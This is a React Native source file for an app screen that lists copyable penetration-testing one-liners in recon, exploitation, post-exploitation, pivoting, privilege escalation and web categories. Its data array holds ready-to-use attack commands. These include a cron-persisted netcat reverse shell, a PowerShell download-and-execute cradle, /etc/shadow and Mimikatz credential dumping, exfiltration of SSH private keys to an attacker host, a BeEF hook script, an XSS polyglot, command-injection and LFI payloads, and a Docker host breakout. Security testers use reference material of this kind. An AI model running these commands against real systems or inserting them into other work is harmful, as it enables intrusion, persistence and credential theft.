import React, { useState, useMemo, useEffect, useRef } from 'react';
import {
  View,
  Text,
  StyleSheet,
  ScrollView,
  TouchableOpacity,
  TextInput,
  Clipboard,
  Animated,
} from 'react-native';
import { DragonBackground } from '../../components/common/DragonBackground';

const THEME = {
  background: '#070f1e',
  primary: '#00ff66',
  accent: '#00d4ff',
  surface: '#0d1b2e',
  card: '#11223a',
  text: '#ffffff',
  textMuted: '#8ba8cc',
  border: '#163252',
  error: '#ff2247',
};

type Category =
  | 'RECON'
  | 'EXPLOITATION'
  | 'POST-EXPLOIT'
  | 'PIVOTING'
  | 'PRIVILEGE_ESC'
  | 'WEB';

interface CommandItem {
  id: string;
  category: Category;
  title: string;
  description: string;
  command: string;
  tags?: string[];
}

const CATEGORIES: Category[] = [
  'RECON',
  'EXPLOITATION',
  'POST-EXPLOIT',
  'PIVOTING',
  'PRIVILEGE_ESC',
  'WEB',
];

const CHEAT_DATA: CommandItem[] = [
  // RECON
  {
    id: 'rec_1',
    category: 'RECON',
    title: 'Nmap Full Port Scan',
    description: 'Comprehensive TCP scan covering all 65,535 ports with script and version detection',
    command: 'nmap -p- -sC -sV -T4 -oA full_scan <TARGET>',
    tags: ['nmap', 'ports', 'recon'],
  },
  {
    id: 'rec_2',
    category: 'RECON',
    title: 'Masscan Ultra-Fast Port Sweep',
    description: 'Blazing fast SYN scanner across all ports at 1000 packets per second',
    command: 'masscan -p1-65535 <TARGET> --rate=1000 -e eth0',
    tags: ['masscan', 'fast', 'syn'],
  },
  {
    id: 'rec_3',
    category: 'RECON',
    title: 'Netdiscover ARP Subnet Scan',
    description: 'Active ARP recognition to uncover alive IPv4 hosts in the local network segment',
    command: 'netdiscover -i eth0 -r 192.168.1.0/24',
    tags: ['netdiscover', 'arp', 'local'],
  },
  {
    id: 'rec_4',
    category: 'RECON',
    title: 'Enum4linux Complete SMB Enumeration',
    description: 'Extract users, shares, password policies, and groups from Windows/Samba targets',
    command: 'enum4linux -a <TARGET_IP>',
    tags: ['smb', 'windows', 'shares'],
  },
  {
    id: 'rec_5',
    category: 'RECON',
    title: 'WhatWeb Aggressive Web Fingerprint',
    description: 'Identifies CMS, web servers, scripting languages, and embedded libraries',
    command: 'whatweb -v -a 3 http://<TARGET>',
    tags: ['web', 'fingerprint', 'technologies'],
  },
  {
    id: 'rec_6',
    category: 'RECON',
    title: 'Dig DNS Zone Transfer (AXFR)',
    description: 'Attempt full DNS zone replication to discover hidden internal hostnames',
    command: 'dig axfr @<DNS_SERVER> <DOMAIN>',
    tags: ['dns', 'axfr', 'transfer'],
  },
  {
    id: 'rec_7',
    category: 'RECON',
    title: 'theHarvester OSINT Email & Host Harvest',
    description: 'Aggregates emails, subdomains, employee names, and public PGP keys from search engines',
    command: 'theHarvester -d <DOMAIN> -b all -l 500',
    tags: ['osint', 'emails', 'subdomains'],
  },
  {
    id: 'rec_8',
    category: 'RECON',
    title: 'OWASP Amass Passive Subdomain Discovery',
    description: 'In-depth OSINT gathering using passive DNS scrapers and certificate registries',
    command: 'amass enum -passive -d <DOMAIN>',
    tags: ['amass', 'subdomains', 'osint'],
  },
  {
    id: 'rec_9',
    category: 'RECON',
    title: 'RustScan Fast Discovery with Nmap Handoff',
    description: 'Discovers open ports in seconds then feeds results straight to Nmap scripts',
    command: 'rustscan -a <TARGET> --ulimit 5000 -- -sC -sV',
    tags: ['rustscan', 'fast', 'nmap'],
  },
  {
    id: 'rec_10',
    category: 'RECON',
    title: 'SMBClient Null Session Share Listing',
    description: 'Query remote SMB target without credentials to list accessible public shares',
    command: 'smbclient -L //<TARGET_IP>/ -N',
    tags: ['smb', 'shares', 'null-session'],
  },

  // EXPLOITATION
  {
    id: 'exp_1',
    category: 'EXPLOITATION',
    title: 'Msfconsole Automated Handler Setup',
    description: 'Spins up a headless multi/handler listener primed for reverse Meterpreter sessions',
    command: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run"',
    tags: ['metasploit', 'handler', 'meterpreter'],
  },
  {
    id: 'exp_2',
    category: 'EXPLOITATION',
    title: 'SQLMap Automated Database Dump',
    description: 'Fingerprints SQL injection vulnerabilities and dumps schema and table contents unattended',
    command: 'sqlmap -u "http://<TARGET>/vuln.php?id=1" --batch --dbs --dump',
    tags: ['sqli', 'sqlmap', 'database'],
  },
  {
    id: 'exp_3',
    category: 'EXPLOITATION',
    title: 'Hydra Multi-Threaded SSH Password Brute',
    description: 'Executes parallel credential spray against SSH daemon using wordlists',
    command: 'hydra -L users.txt -P rockyou.txt -t 4 ssh://<TARGET>',
    tags: ['hydra', 'brute', 'ssh'],
  },
  {
    id: 'exp_4',
    category: 'EXPLOITATION',
    title: 'Nuclei High & Critical CVE Vulnerability Scan',
    description: 'Rule-based YAML template scanner targeting known exploitable remote vulnerabilities',
    command: 'nuclei -u https://<TARGET> -t cves/ -severity critical,high',
    tags: ['nuclei', 'cve', 'templates'],
  },
  {
    id: 'exp_5',
    category: 'EXPLOITATION',
    title: 'Searchsploit Nmap XML Correlation',
    description: 'Correlates discovered service banners from Nmap scan against Exploit-DB archives',
    command: 'searchsploit --nmap scan_output.xml',
    tags: ['exploit-db', 'searchsploit', 'banner'],
  },
  {
    id: 'exp_6',
    category: 'EXPLOITATION',
    title: 'BeEF Client Browser Exploitation Hook',
    description: 'Standard payload tag to inject for client-side XSS exploitation and browser hooking',
    command: '<script src="http://<LHOST>:3000/hook.js"></script>',
    tags: ['beef', 'xss', 'browser'],
  },
  {
    id: 'exp_7',
    category: 'EXPLOITATION',
    title: 'Nikto Comprehensive Web Vulnerability Scan',
    description: 'Scans web servers for dangerous CGIs, outdated software, and insecure headers',
    command: 'nikto -h http://<TARGET> -ssl -Tuning 123b',
    tags: ['nikto', 'web', 'cgi'],
  },
  {
    id: 'exp_8',
    category: 'EXPLOITATION',
    title: 'WPScan Full WordPress Audit',
    description: 'Enumerates usernames, vulnerable plugins, and unpatched themes aggressively',
    command: 'wpscan --url http://<TARGET> --enumerate u,vp,vt --plugins-detection aggressive',
    tags: ['wpscan', 'wordpress', 'cms'],
  },
  {
    id: 'exp_9',
    category: 'EXPLOITATION',
    title: 'Searchsploit Mirror PoC Exploit to Current Directory',
    description: 'Downloads local copy of designated exploit script from Exploit-DB for customization',
    command: 'searchsploit -m <EXPLOIT_ID>',
    tags: ['searchsploit', 'poc', 'source'],
  },
  {
    id: 'exp_10',
    category: 'EXPLOITATION',
    title: 'CrackMapExec Active Directory SMB Spray',
    description: 'Validates credential pairs across full subnet to identify privileged domain access',
    command: 'crackmapexec smb <TARGET_NET> -u users.txt -p pass.txt',
    tags: ['cme', 'active-directory', 'smb'],
  },

  // POST-EXPLOIT
  {
    id: 'post_1',
    category: 'POST-EXPLOIT',
    title: 'LinPEAS Linux Automated Privilege Escalation Script',
    description: 'Searches for misconfigurations, writable binaries, passwords, and CVE vectors on Linux',
    command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
    tags: ['linpeas', 'privesc', 'linux'],
  },
  {
    id: 'post_2',
    category: 'POST-EXPLOIT',
    title: 'WinPEAS In-Memory Execution via PowerShell',
    description: 'Invokes Windows privilege escalation enumerator directly in memory bypassing disk writes',
    command: 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://<LHOST>/winPEASany.exe\')"',
    tags: ['winpeas', 'powershell', 'windows'],
  },
  {
    id: 'post_3',
    category: 'POST-EXPLOIT',
    title: 'Find SUID Binaries with Executable Rights',
    description: 'Lists all setuid executables owned by root that may allow direct root escalation',
    command: 'find / -perm -u=s -type f 2>/dev/null',
    tags: ['suid', 'permissions', 'linux'],
  },
  {
    id: 'post_4',
    category: 'POST-EXPLOIT',
    title: 'Dump Linux Shadow Password Hashes',
    description: 'Extracts password hashes for off-line cracking with hashcat or john the ripper',
    command: 'cat /etc/shadow 2>/dev/null || sudo cat /etc/shadow',
    tags: ['hashes', 'shadow', 'creds'],
  },
  {
    id: 'post_5',
    category: 'POST-EXPLOIT',
    title: 'Meterpreter In-Memory Hashdump',
    description: 'Dumps SAM and SYSTEM database hashes without touching lsass executable on disk',
    command: 'hashdump',
    tags: ['meterpreter', 'sam', 'hashes'],
  },
  {
    id: 'post_6',
    category: 'POST-EXPLOIT',
    title: 'Persist Recurring Cron Reverse Shell',
    description: 'Schedules hidden recurring reverse shell trigger inside target user crontab',
    command: '(crontab -l 2>/dev/null; echo "*/5 * * * * nc -e /bin/bash <LHOST> <LPORT>") | crontab -',
    tags: ['cron', 'persistence', 'shell'],
  },
  {
    id: 'post_7',
    category: 'POST-EXPLOIT',
    title: 'Meterpreter Target Desktop Screenshot',
    description: 'Captures victim graphical desktop environment and saves silently to local loot',
    command: 'screenshot -p /tmp/screen.jpeg -v false',
    tags: ['meterpreter', 'loot', 'screenshot'],
  },
  {
    id: 'post_8',
    category: 'POST-EXPLOIT',
    title: 'Meterpreter Exfiltrate Sensitive File',
    description: 'Downloads sensitive private SSH key or secret configuration to attacker host',
    command: 'download /root/.ssh/id_rsa /home/attacker/loot/id_rsa',
    tags: ['loot', 'exfiltration', 'keys'],
  },
  {
    id: 'post_9',
    category: 'POST-EXPLOIT',
    title: 'Mimikatz Extract Plaintext Passwords from LSASS',
    description: 'Dumps active user credentials, Kerberos tickets, and NTLM hashes from memory',
    command: 'sekurlsa::logonpasswords full',
    tags: ['mimikatz', 'lsass', 'creds'],
  },
  {
    id: 'post_10',
    category: 'POST-EXPLOIT',
    title: 'Inspect Command Shell History Files',
    description: 'Checks shell history for typed passwords, tokens, API keys, and internal IP addresses',
    command: 'cat ~/.bash_history ~/.zsh_history 2>/dev/null',
    tags: ['history', 'osint', 'secrets'],
  },

  // PIVOTING
  {
    id: 'piv_1',
    category: 'PIVOTING',
    title: 'SSH Dynamic Port Forward (SOCKS5 Proxy)',
    description: 'Routes all local security tools through an encrypted SOCKS5 tunnel on port 1080',
    command: 'ssh -N -D 1080 user@<PIVOT_HOST> -p 22',
    tags: ['ssh', 'socks5', 'tunnel'],
  },
  {
    id: 'piv_2',
    category: 'PIVOTING',
    title: 'Chisel Reverse HTTP Tunnel',
    description: 'Encapsulates TCP packets inside HTTP/WebSockets to bypass restrictive firewalls',
    command: 'chisel server -p 8000 --reverse && chisel client <ATTACKER_IP>:8000 R:socks',
    tags: ['chisel', 'reverse', 'proxy'],
  },
  {
    id: 'piv_3',
    category: 'PIVOTING',
    title: 'Socat Port Forwarding Relay',
    description: 'Binds public port on pivot host and redirects incoming traffic to deep internal IP',
    command: 'socat TCP-LISTEN:8080,fork,reuseaddr TCP:<INTERNAL_IP>:80',
    tags: ['socat', 'relay', 'port-forward'],
  },
  {
    id: 'piv_4',
    category: 'PIVOTING',
    title: 'Proxychains Execution through Tunnel',
    description: 'Forces target scanner to route TCP sockets through local Tor or SSH proxy list',
    command: 'proxychains4 nmap -sT -Pn -p 80,443,3389 <INTERNAL_IP>',
    tags: ['proxychains', 'tunneling', 'pivot'],
  },
  {
    id: 'piv_5',
    category: 'PIVOTING',
    title: 'Sshuttle Transparent Subnet VPN Proxy',
    description: 'Creates instant VPN over SSH routing entire internal subnet without admin on pivot',
    command: 'sshuttle -r user@<PIVOT_HOST> 10.10.10.0/24 -v',
    tags: ['sshuttle', 'vpn', 'subnet'],
  },
  {
    id: 'piv_6',
    category: 'PIVOTING',
    title: 'Ncat Bi-Directional Port Relay',
    description: 'Fast lightweight TCP pipe to forward local client requests to internal destination',
    command: 'ncat -l -p 8080 --sh-exec "ncat <INTERNAL_IP> 80"',
    tags: ['ncat', 'pipe', 'relay'],
  },
  {
    id: 'piv_7',
    category: 'PIVOTING',
    title: 'Ligolo-ng High Performance TUN Interface',
    description: 'Establishes kernel-level TUN device for native subnet routing through pivot agent',
    command: 'sudo ip tuntap add user <USER> mode tun ligolo && sudo ip link set ligolo up',
    tags: ['ligolo-ng', 'tun', 'enterprise'],
  },
  {
    id: 'piv_8',
    category: 'PIVOTING',
    title: 'Background Daemonized SOCKS Proxy',
    description: 'Spawns detached SSH tunnel on port 9050 without opening an interactive TTY shell',
    command: 'ssh -f -N -D 9050 user@<PIVOT_HOST>',
    tags: ['ssh', 'daemon', 'socks'],
  },
  {
    id: 'piv_9',
    category: 'PIVOTING',
    title: 'Iptables NAT Prerouting Forwarding Rule',
    description: 'Kernel level packet redirection from external facing port to internal LAN asset',
    command: 'iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination <INTERNAL_IP>:80',
    tags: ['iptables', 'nat', 'routing'],
  },
  {
    id: 'piv_10',
    category: 'PIVOTING',
    title: 'Plink Windows Reverse Port Forwarder',
    description: 'PuTTY CLI tool to expose internal ports from Windows victim back to Kali listener',
    command: 'plink.exe -ssh -l user -pw <PASS> -R 4444:127.0.0.1:4444 <ATTACKER_IP>',
    tags: ['plink', 'windows', 'reverse-tunnel'],
  },

  // PRIVILEGE_ESC
  {
    id: 'priv_1',
    category: 'PRIVILEGE_ESC',
    title: 'Check Sudo Permissions for Current User',
    description: 'Lists allowed commands, NOPASSWD entries, and specific binary execution rights',
    command: 'sudo -l',
    tags: ['sudo', 'linux', 'permissions'],
  },
  {
    id: 'priv_2',
    category: 'PRIVILEGE_ESC',
    title: 'Find World-Writable Directories',
    description: 'Discovers system folders where unprivileged users can plant scripts or hijack paths',
    command: 'find / -writable -type d 2>/dev/null',
    tags: ['writable', 'filesystem', 'linux'],
  },
  {
    id: 'priv_3',
    category: 'PRIVILEGE_ESC',
    title: 'Kernel Version & Known Exploit Auditor',
    description: 'Outputs kernel and distribution info and queries Linux Exploit Suggester script',
    command: 'uname -a; cat /etc/issue; linux-exploit-suggester.sh',
    tags: ['kernel', 'audit', 'cve'],
  },
  {
    id: 'priv_4',
    category: 'PRIVILEGE_ESC',
    title: 'Inspect System-Wide Scheduled Cron Jobs',
    description: 'Reveals root cron tasks executing scripts with improper file permissions',
    command: 'ls -la /etc/cron* /etc/crontab /var/spool/cron/crontabs',
    tags: ['cron', 'jobs', 'escalation'],
  },
  {
    id: 'priv_5',
    category: 'PRIVILEGE_ESC',
    title: 'SUID Executables Inspection for GTFOBins',
    description: 'Finds binaries with root SUID bit that match GTFOBins breakout templates',
    command: 'find / -perm -4000 -exec ls -ldb {} \\; 2>/dev/null',
    tags: ['suid', 'gtfobins', 'root'],
  },
  {
    id: 'priv_6',
    category: 'PRIVILEGE_ESC',
    title: 'Inspect Linux POSIX Binary Capabilities',
    description: 'Finds executables granted elevated capabilities (e.g., cap_setuid, cap_net_raw)',
    command: 'getcap -r / 2>/dev/null',
    tags: ['capabilities', 'getcap', 'posix'],
  },
  {
    id: 'priv_7',
    category: 'PRIVILEGE_ESC',
    title: 'PATH Environment Variable Hijack Check',
    description: 'Reveals current PATH ordering and finds writable script dependencies',
    command: 'echo $PATH; find / -name "*.sh" -writable 2>/dev/null',
    tags: ['path', 'hijack', 'environment'],
  },
  {
    id: 'priv_8',
    category: 'PRIVILEGE_ESC',
    title: 'Docker Container Root Breakout (Host Mount)',
    description: 'Mounts host root filesystem into container to escape Docker boundary with root privilege',
    command: 'docker run -v /:/host -it ubuntu chroot /host /bin/bash',
    tags: ['docker', 'breakout', 'container'],
  },
  {
    id: 'priv_9',
    category: 'PRIVILEGE_ESC',
    title: 'Windows Unquoted Service Path Detection',
    description: 'Queries WMIC for auto-starting services with spaces in path missing quote wrappers',
    command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"',
    tags: ['windows', 'services', 'unquoted'],
  },
  {
    id: 'priv_10',
    category: 'PRIVILEGE_ESC',
    title: 'Windows Impersonation & Debug Token Privileges',
    description: 'Checks whoami privileges for Potato exploit vectors (SeImpersonate / SeDebug)',
    command: 'whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"',
    tags: ['windows', 'tokens', 'potato'],
  },

  // WEB
  {
    id: 'web_1',
    category: 'WEB',
    title: 'Gobuster Directory & Extension Fuzzing',
    description: 'Fast concurrent HTTP directory brute-force testing common script extensions',
    command: 'gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50',
    tags: ['gobuster', 'fuzzing', 'dirs'],
  },
  {
    id: 'web_2',
    category: 'WEB',
    title: 'FFUF Virtual Host (VHost) Discovery',
    description: 'Fuzzes Host HTTP header to discover unlisted subdomains and virtual host roots',
    command: 'ffuf -w subdomains.txt -u http://<TARGET> -H "Host: FUZZ.<DOMAIN>" -mc 200,301,302',
    tags: ['ffuf', 'vhosts', 'web'],
  },
  {
    id: 'web_3',
    category: 'WEB',
    title: 'SQLMap Raw HTTP Request Injection',
    description: 'Feeds raw Burp Suite HTTP POST request file for aggressive parameter SQL testing',
    command: 'sqlmap -r request.txt -p username --batch --risk=3 --level=5 --dbs',
    tags: ['sqlmap', 'post', 'injection'],
  },
  {
    id: 'web_4',
    category: 'WEB',
    title: 'Universal XSS Polyglot Payload',
    description: 'Bypasses multi-context HTML, JS attribute, tag, and style sanitizers',
    command: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    tags: ['xss', 'polyglot', 'client-side'],
  },
  {
    id: 'web_5',
    category: 'WEB',
    title: 'Curl Authenticated POST Header Inspection',
    description: 'Sends authentication payload and prints HTTP response headers with TLS skip',
    command: 'curl -i -s -k -X POST -d "user=admin&pass=pass" "https://<TARGET>/api/login"',
    tags: ['curl', 'http', 'api'],
  },
  {
    id: 'web_6',
    category: 'WEB',
    title: 'Wfuzz Parameter Hidden Variable Discovery',
    description: 'Fuzzes GET query parameter names to uncover hidden debug and administrative backdoors',
    command: 'wfuzz -c -z file,params.txt --hc 404 http://<TARGET>/page.php?FUZZ=1',
    tags: ['wfuzz', 'parameters', 'fuzz'],
  },
  {
    id: 'web_7',
    category: 'WEB',
    title: 'CORS Misconfiguration Origin Reflection Test',
    description: 'Tests if remote API reflects arbitrary origin and allows credentials in CORS',
    command: 'curl -H "Origin: https://evil.com" -I https://<TARGET>/api/user',
    tags: ['cors', 'api', 'headers'],
  },
  {
    id: 'web_8',
    category: 'WEB',
    title: 'JWT Decode & Payload Inspection (Python One-Liner)',
    description: 'Decodes and pretty-prints JSON Web Token headers and payload without key verification',
    command: 'python3 -c "import jwt, json, sys; print(json.dumps(jwt.decode(sys.argv[1], options={\'verify_signature\': False}), indent=2))" "<JWT_TOKEN>"',
    tags: ['jwt', 'tokens', 'auth'],
  },
  {
    id: 'web_9',
    category: 'WEB',
    title: 'Remote Command Injection Proof of Concept',
    description: 'Multi-command chaining payload to confirm command execution and system context',
    command: '; uname -a; id; whoami; ping -c 3 <LHOST>',
    tags: ['rce', 'injection', 'command'],
  },
  {
    id: 'web_10',
    category: 'WEB',
    title: 'PHP Filter LFI Base64 Source Disclosure',
    description: 'Exploits local file inclusion using php stream filters to read unexecuted source code',
    command: 'php://filter/convert.base64-encode/resource=index.php',
    tags: ['lfi', 'php-filter', 'disclosure'],
  },
];

export const CheatSheetScreen = ({ navigation }: any) => {
  const [selectedCategory, setSelectedCategory] = useState<Category>('RECON');
  const [searchQuery, setSearchQuery] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const toastFadeAnim = useRef(new Animated.Value(0)).current;
  const timeoutRef = useRef<any>(null);

  const showToast = (message: string) => {
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
    }
    setToastMessage(message);

    Animated.sequence([
      Animated.timing(toastFadeAnim, {
        toValue: 1,
        duration: 150,
        useNativeDriver: true,
      }),
      Animated.delay(1800),
      Animated.timing(toastFadeAnim, {
        toValue: 0,
        duration: 250,
        useNativeDriver: true,
      }),
    ]).start(() => {
      setToastMessage(null);
    });
  };

  const handleCopyCommand = (cmd: CommandItem) => {
    try {
      if (Clipboard && typeof Clipboard.setString === 'function') {
        Clipboard.setString(cmd.command);
      }
    } catch (e) {
      // safe fallback
    }
    setCopiedId(cmd.id);
    showToast(`COPIED TO CLIPBOARD: ${cmd.title}`);
    setTimeout(() => {
      setCopiedId(null);
    }, 2000);
  };

  const filteredCommands = useMemo(() => {
    return CHEAT_DATA.filter(item => {
      const matchCategory = item.category === selectedCategory;
      const query = searchQuery.trim().toLowerCase();
      if (!query) return matchCategory;

      const inTitle = item.title.toLowerCase().includes(query);
      const inDesc = item.description.toLowerCase().includes(query);
      const inCmd = item.command.toLowerCase().includes(query);
      const inTag = item.tags?.some(t => t.toLowerCase().includes(query));

      return matchCategory && (inTitle || inDesc || inCmd || inTag);
    });
  }, [selectedCategory, searchQuery]);

  const categoryCounts = useMemo(() => {
    const counts: Record<string, number> = {};
    for (const cat of CATEGORIES) {
      counts[cat] = CHEAT_DATA.filter(c => c.category === cat).length;
    }
    return counts;
  }, []);

  return (
    <DragonBackground overlayOpacity={0.84}>
      <View style={styles.container}>
        {/* Top Header */}
        <View style={styles.header}>
          <View style={styles.headerRow}>
            <Text style={styles.headerTitle}>CHEAT_SHEETS // QUICK REFERENCE</Text>
            <View style={styles.liveIndicator}>
              <View style={styles.liveDot} />
              <Text style={styles.liveText}>READY</Text>
            </View>
          </View>
          <Text style={styles.headerSubtitle}>
            Combat-proven offensive & defensive terminal one-liners
          </Text>
        </View>

        {/* Search Bar */}
        <View style={styles.searchContainer}>
          <Text style={styles.searchPrompt}>$ search &gt;</Text>
          <TextInput
            style={styles.searchInput}
            placeholder="filter commands, keywords, flags..."
            placeholderTextColor={THEME.textMuted}
            value={searchQuery}
            onChangeText={setSearchQuery}
            autoCapitalize="none"
            autoCorrect={false}
          />
          {searchQuery.length > 0 && (
            <TouchableOpacity
              onPress={() => setSearchQuery('')}
              style={styles.clearSearchBtn}
            >
              <Text style={styles.clearSearchText}>✕</Text>
            </TouchableOpacity>
          )}
        </View>

        {/* Category Tabs */}
        <View style={styles.tabsWrapper}>
          <ScrollView
            horizontal
            showsHorizontalScrollIndicator={false}
            contentContainerStyle={styles.tabsContainer}
          >
            {CATEGORIES.map(category => {
              const isSelected = selectedCategory === category;
              return (
                <TouchableOpacity
                  key={category}
                  style={[
                    styles.tabButton,
                    isSelected && styles.tabButtonActive,
                  ]}
                  onPress={() => setSelectedCategory(category)}
                  activeOpacity={0.7}
                >
                  <Text
                    style={[
                      styles.tabText,
                      isSelected && styles.tabTextActive,
                    ]}
                  >
                    {category}
                  </Text>
                  <View
                    style={[
                      styles.tabBadge,
                      isSelected && styles.tabBadgeActive,
                    ]}
                  >
                    <Text
                      style={[
                        styles.tabBadgeText,
                        isSelected && styles.tabBadgeTextActive,
                      ]}
                    >
                      {categoryCounts[category] || 0}
                    </Text>
                  </View>
                </TouchableOpacity>
              );
            })}
          </ScrollView>
        </View>

        {/* Toast Alert Banner */}
        {toastMessage && (
          <Animated.View
            style={[styles.toastContainer, { opacity: toastFadeAnim }]}
          >
            <View style={styles.toastGlow}>
              <Text style={styles.toastIcon}>✔</Text>
              <Text style={styles.toastText} numberOfLines={1}>
                {toastMessage}
              </Text>
            </View>
          </Animated.View>
        )}

        {/* Command Cards List */}
        <ScrollView
          style={styles.scrollList}
          contentContainerStyle={styles.scrollContent}
          keyboardShouldPersistTaps="handled"
        >
          <View style={styles.sectionHeaderRow}>
            <Text style={styles.sectionHeaderTitle}>
              // {selectedCategory} ({filteredCommands.length} COMMANDS)
            </Text>
            <Text style={styles.sectionTip}>TAP CODE BLOCK OR BUTTON TO COPY</Text>
          </View>

          {filteredCommands.length === 0 ? (
            <View style={styles.emptyCard}>
              <Text style={styles.emptyTitle}>NO COMMANDS FOUND</Text>
              <Text style={styles.emptySubtitle}>
                No commands matched "{searchQuery}" in {selectedCategory} category.
              </Text>
            </View>
          ) : (
            filteredCommands.map((item, index) => {
              const isCopied = copiedId === item.id;
              return (
                <View key={item.id} style={styles.commandCard}>
                  {/* Card Header */}
                  <View style={styles.cardHeader}>
                    <View style={styles.titleRow}>
                      <Text style={styles.indexNum}>
                        [{String(index + 1).padStart(2, '0')}]
                      </Text>
                      <Text style={styles.cardTitle}>{item.title}</Text>
                    </View>
                    <TouchableOpacity
                      style={[
                        styles.copyButton,
                        isCopied && styles.copyButtonSuccess,
                      ]}
                      onPress={() => handleCopyCommand(item)}
                      activeOpacity={0.7}
                    >
                      <Text
                        style={[
                          styles.copyButtonText,
                          isCopied && styles.copyButtonTextSuccess,
                        ]}
                      >
                        {isCopied ? 'COPIED!' : 'COPY'}
                      </Text>
                    </TouchableOpacity>
                  </View>

                  {/* Description */}
                  <Text style={styles.cardDescription}>{item.description}</Text>

                  {/* Monospace Code Block */}
                  <TouchableOpacity
                    style={[
                      styles.codeBlock,
                      isCopied && styles.codeBlockCopied,
                    ]}
                    onPress={() => handleCopyCommand(item)}
                    activeOpacity={0.8}
                  >
                    <View style={styles.codeBlockHeader}>
                      <Text style={styles.codePromptSymbol}>$</Text>
                      <Text style={styles.codeLangTag}>SHELL</Text>
                    </View>
                    <Text
                      style={[
                        styles.codeText,
                        isCopied && styles.codeTextCopied,
                      ]}
                      selectable
                    >
                      {item.command}
                    </Text>
                  </TouchableOpacity>

                  {/* Tags footer */}
                  {item.tags && item.tags.length > 0 && (
                    <View style={styles.tagsRow}>
                      {item.tags.map((tag, tIdx) => (
                        <View key={tIdx} style={styles.tagBadge}>
                          <Text style={styles.tagText}>#{tag}</Text>
                        </View>
                      ))}
                    </View>
                  )}
                </View>
              );
            })
          )}

          <View style={styles.bottomSpacer} />
        </ScrollView>
      </View>
    </DragonBackground>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  header: {
    paddingHorizontal: 16,
    paddingTop: 16,
    paddingBottom: 10,
    borderBottomWidth: 1,
    borderBottomColor: THEME.border,
    backgroundColor: 'rgba(7, 15, 30, 0.75)',
  },
  headerRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 4,
  },
  headerTitle: {
    fontFamily: 'monospace',
    fontSize: 16,
    fontWeight: 'bold',
    color: THEME.primary,
    letterSpacing: 1.2,
  },
  liveIndicator: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: 'rgba(0, 255, 102, 0.1)',
    paddingHorizontal: 8,
    paddingVertical: 3,
    borderRadius: 4,
    borderWidth: 1,
    borderColor: 'rgba(0, 255, 102, 0.3)',
  },
  liveDot: {
    width: 6,
    height: 6,
    borderRadius: 3,
    backgroundColor: THEME.primary,
    marginRight: 6,
  },
  liveText: {
    fontFamily: 'monospace',
    fontSize: 10,
    color: THEME.primary,
    fontWeight: '700',
  },
  headerSubtitle: {
    fontFamily: 'monospace',
    fontSize: 11,
    color: THEME.textMuted,
  },
  searchContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    marginHorizontal: 16,
    marginTop: 10,
    marginBottom: 8,
    backgroundColor: THEME.surface,
    borderWidth: 1,
    borderColor: THEME.border,
    borderRadius: 6,
    paddingHorizontal: 10,
    paddingVertical: 4,
  },
  searchPrompt: {
    fontFamily: 'monospace',
    fontSize: 12,
    color: THEME.accent,
    marginRight: 8,
    fontWeight: '700',
  },
  searchInput: {
    flex: 1,
    fontFamily: 'monospace',
    fontSize: 12,
    color: THEME.text,
    paddingVertical: 6,
  },
  clearSearchBtn: {
    paddingHorizontal: 8,
    paddingVertical: 4,
  },
  clearSearchText: {
    fontFamily: 'monospace',
    fontSize: 13,
    color: THEME.textMuted,
  },
  tabsWrapper: {
    borderBottomWidth: 1,
    borderBottomColor: THEME.border,
    backgroundColor: 'rgba(13, 27, 46, 0.8)',
  },
  tabsContainer: {
    paddingHorizontal: 12,
    paddingVertical: 8,
    gap: 8,
  },
  tabButton: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingHorizontal: 12,
    paddingVertical: 7,
    borderRadius: 4,
    borderWidth: 1,
    borderColor: THEME.border,
    backgroundColor: THEME.card,
    marginRight: 6,
  },
  tabButtonActive: {
    borderColor: THEME.primary,
    backgroundColor: 'rgba(0, 255, 102, 0.12)',
  },
  tabText: {
    fontFamily: 'monospace',
    fontSize: 11,
    fontWeight: '700',
    color: THEME.textMuted,
    marginRight: 6,
  },
  tabTextActive: {
    color: THEME.primary,
  },
  tabBadge: {
    paddingHorizontal: 5,
    paddingVertical: 1,
    borderRadius: 3,
    backgroundColor: 'rgba(255, 255, 255, 0.08)',
  },
  tabBadgeActive: {
    backgroundColor: THEME.primary,
  },
  tabBadgeText: {
    fontFamily: 'monospace',
    fontSize: 9,
    color: THEME.textMuted,
    fontWeight: 'bold',
  },
  tabBadgeTextActive: {
    color: THEME.background,
  },
  toastContainer: {
    position: 'absolute',
    top: 135,
    left: 20,
    right: 20,
    zIndex: 999,
  },
  toastGlow: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#0a221a',
    borderWidth: 1,
    borderColor: THEME.primary,
    borderRadius: 6,
    paddingHorizontal: 14,
    paddingVertical: 10,
    shadowColor: THEME.primary,
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.8,
    shadowRadius: 8,
    elevation: 8,
  },
  toastIcon: {
    fontFamily: 'monospace',
    fontSize: 13,
    color: THEME.primary,
    marginRight: 8,
    fontWeight: 'bold',
  },
  toastText: {
    flex: 1,
    fontFamily: 'monospace',
    fontSize: 11,
    color: THEME.text,
    fontWeight: 'bold',
  },
  scrollList: {
    flex: 1,
  },
  scrollContent: {
    padding: 16,
  },
  sectionHeaderRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'baseline',
    marginBottom: 12,
  },
  sectionHeaderTitle: {
    fontFamily: 'monospace',
